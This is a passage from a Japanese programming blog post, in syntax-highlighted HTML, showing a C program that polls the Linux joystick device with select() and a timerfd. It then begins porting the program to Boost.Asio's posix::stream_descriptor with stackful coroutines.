<span id="cb6-32"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-32" aria-hidden="true" tabindex="-1"></a>        state<span class="op">-&gt;</span>axes<span class="op">[</span>jse<span class="op">-&gt;</span>number<span class="op">]</span> <span class="op">=</span> jse<span class="op">-&gt;</span>value<span class="op">;</span></span>
<span id="cb6-33"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-33" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb6-34"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-34" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb6-35"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-35" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> JS_EVENT_BUTTON<span class="op">:</span></span>
<span id="cb6-36"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-36" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>jse<span class="op">-&gt;</span>number <span class="op">&lt;</span> state<span class="op">-&gt;</span>num_buttons<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-37"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-37" aria-hidden="true" tabindex="-1"></a>        state<span class="op">-&gt;</span>buttons<span class="op">[</span>jse<span class="op">-&gt;</span>number<span class="op">]</span> <span class="op">=</span> jse<span class="op">-&gt;</span>value<span class="op">;</span></span>
<span id="cb6-38"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-38" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb6-39"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-39" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb6-40"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-40" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-41"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-41" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-42"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-43"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-43" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> print_joystick_state<span class="op">(</span><span class="kw">struct</span> joystick_state<span class="op">*</span> state<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-44"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-44" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\r</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb6-45"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-45" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;axes: &quot;</span><span class="op">);</span></span>
<span id="cb6-46"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-46" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">uint16_t</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="op">(</span><span class="dt">uint16_t</span><span class="op">)</span>state<span class="op">-&gt;</span>num_axes<span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-47"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-47" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%6&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> state<span class="op">-&gt;</span>axes<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb6-48"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-48" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-49"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-49" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;buttons: &quot;</span><span class="op">);</span></span>
<span id="cb6-50"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-50" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">uint16_t</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="op">(</span><span class="dt">uint16_t</span><span class="op">)</span>state<span class="op">-&gt;</span>num_buttons<span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-51"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-51" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;%&quot;</span> PRId16 <span class="st">&quot; &quot;</span><span class="op">,</span> state<span class="op">-&gt;</span>buttons<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb6-52"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-52" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-53"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-53" aria-hidden="true" tabindex="-1"></a>  fflush<span class="op">(</span>stdout<span class="op">);</span></span>
<span id="cb6-54"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-54" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-55"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-56"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-56" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">**</span> argv<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-57"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-57" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>argc <span class="op">!=</span> <span class="dv">2</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-58"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-58" aria-hidden="true" tabindex="-1"></a>    fprintf<span class="op">(</span>stderr<span class="op">,</span> <span class="st">&quot;usage: %s &lt;device&gt;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> argv<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
<span id="cb6-59"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-59" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb6-60"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-60" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-61"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-61" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-62"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-62" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> joy_fd <span class="op">=</span> open<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">],</span> O_RDONLY<span class="op">);</span></span>
<span id="cb6-63"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-63" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>joy_fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-64"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-64" aria-hidden="true" tabindex="-1"></a>    perror_exit<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
<span id="cb6-65"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-65" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-66"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-67"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-67" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> joystick_state state<span class="op">;</span></span>
<span id="cb6-68"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-68" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb6-69"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-69" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>joy_fd<span class="op">,</span> JSIOCGAXES<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_axes<span class="op">);</span></span>
<span id="cb6-70"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-70" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>joy_fd<span class="op">,</span> JSIOCGBUTTONS<span class="op">,</span> <span class="op">&amp;</span>state<span class="op">.</span>num_buttons<span class="op">);</span></span>
<span id="cb6-71"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-71" aria-hidden="true" tabindex="-1"></a>    state<span class="op">.</span>axes    <span class="op">=</span> <span class="op">(</span><span class="dt">int16_t</span><span class="op">*)</span>calloc<span class="op">(</span>state<span class="op">.</span>num_axes<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">int16_t</span><span class="op">));</span></span>
<span id="cb6-72"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-72" aria-hidden="true" tabindex="-1"></a>    state<span class="op">.</span>buttons <span class="op">=</span> <span class="op">(</span><span class="dt">int16_t</span><span class="op">*)</span>calloc<span class="op">(</span>state<span class="op">.</span>num_buttons<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">int16_t</span><span class="op">));</span></span>
<span id="cb6-73"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-73" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-74"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-74" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-75"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-75" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> timer_fd <span class="op">=</span> timerfd_create<span class="op">(</span>CLOCK_REALTIME<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb6-76"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-76" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>timer_fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-77"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-77" aria-hidden="true" tabindex="-1"></a>    perror_exit<span class="op">(</span><span class="st">&quot;timerfd_create&quot;</span><span class="op">);</span></span>
<span id="cb6-78"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-78" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-79"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-80"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-80" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> itimerspec nexttime<span class="op">;</span></span>
<span id="cb6-81"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-81" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb6-82"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-82" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> timespec now<span class="op">;</span></span>
<span id="cb6-83"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-83" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>clock_gettime<span class="op">(</span>CLOCK_REALTIME<span class="op">,</span> <span class="op">&amp;</span>now<span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-84"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-84" aria-hidden="true" tabindex="-1"></a>      perror_exit<span class="op">(</span><span class="st">&quot;clock_gettime&quot;</span><span class="op">);</span></span>
<span id="cb6-85"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-85" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb6-86"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-86" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1/60 [sec] = 16,666,666 [ns]</span></span>
<span id="cb6-87"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-87" aria-hidden="true" tabindex="-1"></a>    nexttime<span class="op">.</span>it_interval<span class="op">.</span>tv_sec  <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb6-88"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-88" aria-hidden="true" tabindex="-1"></a>    nexttime<span class="op">.</span>it_interval<span class="op">.</span>tv_nsec <span class="op">=</span> <span class="dv">16666666</span><span class="op">;</span></span>
<span id="cb6-89"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-89" aria-hidden="true" tabindex="-1"></a>    nexttime<span class="op">.</span>it_value<span class="op">.</span>tv_sec     <span class="op">=</span> nexttime<span class="op">.</span>it_interval<span class="op">.</span>tv_sec <span class="op">+</span> now<span class="op">.</span>tv_sec<span class="op">;</span></span>
<span id="cb6-90"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-90" aria-hidden="true" tabindex="-1"></a>    nexttime<span class="op">.</span>it_value<span class="op">.</span>tv_nsec    <span class="op">=</span> nexttime<span class="op">.</span>it_interval<span class="op">.</span>tv_nsec <span class="op">+</span> now<span class="op">.</span>tv_nsec<span class="op">;</span></span>
<span id="cb6-91"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-91" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-92"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-92" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-93"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-93" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>timerfd_settime<span class="op">(</span>timer_fd<span class="op">,</span> TFD_TIMER_ABSTIME<span class="op">,</span> <span class="op">&amp;</span>nexttime<span class="op">,</span> NULL<span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-94"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-94" aria-hidden="true" tabindex="-1"></a>    perror_exit<span class="op">(</span><span class="st">&quot;timerfd_settime&quot;</span><span class="op">);</span></span>
<span id="cb6-95"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-95" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-96"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-96" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-97"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-97" aria-hidden="true" tabindex="-1"></a>  print_joystick_state<span class="op">(&amp;</span>state<span class="op">);</span></span>
<span id="cb6-98"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-98" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-99"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-99" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-100"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-100" aria-hidden="true" tabindex="-1"></a>    fd_set rfds<span class="op">;</span></span>
<span id="cb6-101"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-101" aria-hidden="true" tabindex="-1"></a>    FD_ZERO<span class="op">(&amp;</span>rfds<span class="op">);</span></span>
<span id="cb6-102"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-102" aria-hidden="true" tabindex="-1"></a>    FD_SET<span class="op">(</span>joy_fd<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">);</span></span>
<span id="cb6-103"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-103" aria-hidden="true" tabindex="-1"></a>    FD_SET<span class="op">(</span>timer_fd<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">);</span></span>
<span id="cb6-104"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-104" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-105"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-105" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> maxfd <span class="op">=</span> joy_fd <span class="op">&gt;</span> timer_fd <span class="op">?</span> joy_fd <span class="op">:</span> timer_fd<span class="op">;</span></span>
<span id="cb6-106"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-106" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-107"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-107" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> ret <span class="op">=</span> select<span class="op">(</span>maxfd <span class="op">+</span> <span class="dv">1</span><span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">);</span></span>
<span id="cb6-108"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-108" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ret <span class="op">&gt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-109"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-109" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>joy_fd<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span> <span class="op">{</span></span>
<span id="cb6-110"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-110" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> js_event jse<span class="op">;</span></span>
<span id="cb6-111"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-111" aria-hidden="true" tabindex="-1"></a>        <span class="dt">ssize_t</span> s <span class="op">=</span> read<span class="op">(</span>joy_fd<span class="op">,</span> <span class="op">&amp;</span>jse<span class="op">,</span> <span class="kw">sizeof</span> jse<span class="op">);</span></span>
<span id="cb6-112"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-112" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>s <span class="op">!=</span> <span class="kw">sizeof</span> jse<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-113"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-113" aria-hidden="true" tabindex="-1"></a>          perror_exit<span class="op">(</span><span class="st">&quot;read(joy_fd)&quot;</span><span class="op">);</span></span>
<span id="cb6-114"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-114" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb6-115"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-115" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-116"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-116" aria-hidden="true" tabindex="-1"></a>        update_joystick_state<span class="op">(&amp;</span>state<span class="op">,</span> <span class="op">&amp;</span>jse<span class="op">);</span></span>
<span id="cb6-117"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-117" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb6-118"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-118" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-119"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-119" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>timer_fd<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span> <span class="op">{</span></span>
<span id="cb6-120"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-120" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint64_t</span> t<span class="op">;</span></span>
<span id="cb6-121"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-121" aria-hidden="true" tabindex="-1"></a>        <span class="dt">ssize_t</span> s <span class="op">=</span> read<span class="op">(</span>timer_fd<span class="op">,</span> <span class="op">&amp;</span>t<span class="op">,</span> <span class="kw">sizeof</span> t<span class="op">);</span></span>
<span id="cb6-122"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-122" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>s <span class="op">!=</span> <span class="kw">sizeof</span> t<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-123"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-123" aria-hidden="true" tabindex="-1"></a>          perror_exit<span class="op">(</span><span class="st">&quot;read(timer_fd)&quot;</span><span class="op">);</span></span>
<span id="cb6-124"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-124" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb6-125"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-125" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-126"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-126" aria-hidden="true" tabindex="-1"></a>        print_joystick_state<span class="op">(&amp;</span>state<span class="op">);</span></span>
<span id="cb6-127"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-127" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb6-128"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-128" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb6-129"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-129" aria-hidden="true" tabindex="-1"></a>      perror_exit<span class="op">(</span><span class="st">&quot;select&quot;</span><span class="op">);</span></span>
<span id="cb6-130"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-130" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb6-131"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-131" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb6-132"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-132" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p style="text-align: center;">
<object data="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/joy_c.svg" style="max-width: 100%">
</object>
</p>
<h2 id="posixstream_descriptor-で-joystick-api"><code>posix::stream_descriptor</code> で Joystick API</h2>
<p>先程の例ではタイマーや非同期 IO などが登場していました。そう、Boost.Asio の得意分野です。ということで、同様のプログラムを Boost.Asio で実装してみましょう。</p>
<p><code>include</code> するヘッダは以下の通り。今回は <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/overview/core/spawn.html">stackful coroutine</a> を使いたいので、<code>&lt;boost/asio/spawn.hpp&gt;</code> も <code>include</code> します。Boost.Asio の coroutine には boost 1.62.0 で deplicated になった Boost.Coroutine が使われていて警告メッセージが出るので、静かにしてもらうために <code>BOOST_COROUTINES_NO_DEPRECATION_WARNING</code> を <code>define</code> しています。C のヘッダは <code>extern "C"</code> で囲んでやりましょう。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb7-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;chrono&gt;</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cinttypes&gt;</span></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cstdint&gt;</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cstdlib&gt;</span></span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;iostream&gt;</span></span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;vector&gt;</span></span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BOOST_COROUTINES_NO_DEPRECATION_WARNING</span></span>
<span id="cb7-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/asio.hpp&gt;</span></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/asio/spawn.hpp&gt;</span></span>
<span id="cb7-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="at">extern</span> <span class="st">&quot;C&quot;</span> <span class="op">{</span></span>
<span id="cb7-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
